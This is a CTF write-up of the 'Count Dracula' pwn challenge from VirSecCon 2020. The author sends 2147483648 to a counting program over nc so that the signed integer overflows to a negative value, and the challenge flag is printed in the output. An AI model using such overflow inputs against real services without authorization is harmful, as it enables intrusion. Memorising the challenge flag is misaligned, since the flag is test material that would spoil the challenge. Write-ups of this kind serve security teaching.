## Count Dracula (Pwn, 75pts)  
# Enumeration

By connecting to the given address we are given a mini application where we have a Dracula counting for us,
it states though that cannnot handle negative numbers ... . interesting...


```
shad3@zeroday:~/Desktop/Security/CTF/virsec/VirSecCon 2020$ nc jh2i.com 50037

              oooOOOooo
           oOOOOOOOOOOOOOo
         oOO"           "OO
    ____oOO  ====   ====  OOo____ 
    \   OO'      ! !.---. 'OO   /
     \  OO   <0> ! !!<0>!  OO  /
      \ Oo       ! !'---'  oO /
       \o        \_/        o/
        .' _______________ '.
      ,'   :   V     V   :   '.
    ,'      -_         _-      '.
  ,'          "oOOOOOo"          '.
,'              OOOOO              '.
-----------     "OOO"     -----------
                 "O"             
 
Hello! I am Count Dracula, and I like to count!
 
What number shall we count up to? I can't handle negative numbers!
> 999

Okay, let's count to 999!

         1... 2... skip a few... 999!

Thanks for counting with me, until next time!
```

# Exploitation

Shortly after trying different types of attacks I figgured out its an Integer Overflow challenge, the concept
is to force the number to become negative... :) so lets send the infamous 2147483648 so it will get 
wrapped around and get our flag.

Read Suggestion FYI:
https://sploitfun.wordpress.com/2015/06/23/integer-overflow/



```shad3@zeroday:~/Desktop/Security/CTF/virsec/VirSecCon 2020$ nc jh2i.com 50037

              oooOOOooo
           oOOOOOOOOOOOOOo
         oOO"           "OO
    ____oOO  ====   ====  OOo____ 
    \   OO'      ! !.---. 'OO   /
     \  OO   <0> ! !!<0>!  OO  /
      \ Oo       ! !'---'  oO /
       \o        \_/        o/
        .' _______________ '.
      ,'   :   V     V   :   '.
    ,'      -_         _-      '.
  ,'          "oOOOOOo"          '.
,'              OOOOO              '.
-----------     "OOO"     -----------
                 "O"             
 
Hello! I am Count Dracula, and I like to count!
 
What number shall we count up to? I can't handle negative numbers!
> 2147483648                                                  

Okay, let's count to -2147483648!

         1... 2... skip a few... -2147483648!
OH NO, I COUNTED ALL WRONG!
OH NOOOOOOOOOOOOOO

DO YOU KNOW WHAT THIS MEANS???!!

5...

4...

3...
THAT'S NOT ME COUNTING... ! !

2...

1...


                               _.-^^---....,,--
                           _--                  --_
                          <                        >)
                          |                         |
                           \._                   _./
                              ```--. . , ; .--'''
                                    | |   |
                                 .-=||  | |=-.
                                 `-=#$%&%$#=-'
                                    | ;  :|
                           _____.,-#%&$@%#&#~,._____ 



                                 __ ,
     _______            _      ,"  )
 ,=""       """>-._ __," )    ( _,"
(  (                 "("" ,    " __
 \         (      C   "*=,  ,  ,"  ")    
  )    )    )  ",         )  _(   )*    
 (     ((        )      ((  ( 
  ",     )               ),     LLS{2147483647_thats_the_number_of_the_day}

    ))              *;=-"                        
   /"          (   ,=""=,,_                                    r,r
  (           __,=,>,_    "*==,_"==,,_         oOOOo          dlpr*
   "=,____.-=",      "  .__  '"*;>,_=7<;_,-._.O ;   o.___        7y
    jjs       "u         '""*;;7 7"       \  )       )  /    _//
                            ,_:*/          \ |) X  X { /  __/ ")
                             '"*{           \{;,,_^_," =" (_,"
                                 \_        /  \\,_.;{      \;
                                   7      }_._.'=--='___.-_='
                                  /   __ /"
                                 {     '">,__
                                  \    ;"   c)
                                   ", _)>=-<"
```
